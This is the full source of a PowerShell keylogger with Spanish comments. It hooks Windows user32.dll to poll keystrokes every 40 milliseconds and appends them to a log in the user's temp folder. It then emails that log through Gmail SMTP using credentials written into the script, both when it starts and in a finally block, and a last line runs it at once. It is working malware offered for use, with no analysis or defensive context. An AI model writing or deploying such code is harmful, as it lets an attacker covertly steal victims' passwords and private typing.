# powershell keylogger


# Credenciales de gmail
$email = "example@gmail.com"
$password = "password"

# keylogger
function KeyLogger($logFile="$env:temp/$env:UserName.log") {

  # Proceso correo
  $logs = Get-Content "$logFile"
  $subject = "$env:UserName logs"
  $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
  $smtp.EnableSSL = $true
  $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
  $smtp.Send($email, $email, $subject, $logs);

  # Generando logs
  $generateLog = New-Item -Path $logFile -ItemType File -Force

  # Firmas de la API
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

 # Definiendo la API
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

  # Intento de registrar las pulsaciones de tecla
  try {
    while ($true) {
      Start-Sleep -Milliseconds 40

      for ($ascii = 9; $ascii -le 254; $ascii++) {

        # Llamada API: obtener el estado de la tecla
        $keystate = $API::GetAsyncKeyState($ascii)

        # Llamada API: detectar pulsación de teclas
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock

          # Mapa de la llave virtual
          $mapKey = $API::MapVirtualKey($ascii, 3)

          # Creando constructor de cadenas
          $keyboardState = New-Object Byte[] 256
          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder

          # traduciendo la llave virutal
          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
            # la llave logueada con el archivo
            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
          }
        }
      }
    }
  }

  # enviar logs si el codigo falla
  finally {
    # enviar email
    $smtp.Send($email, $email, $subject, $logs);
  }
}

# ejecutar keylogger
KeyLogger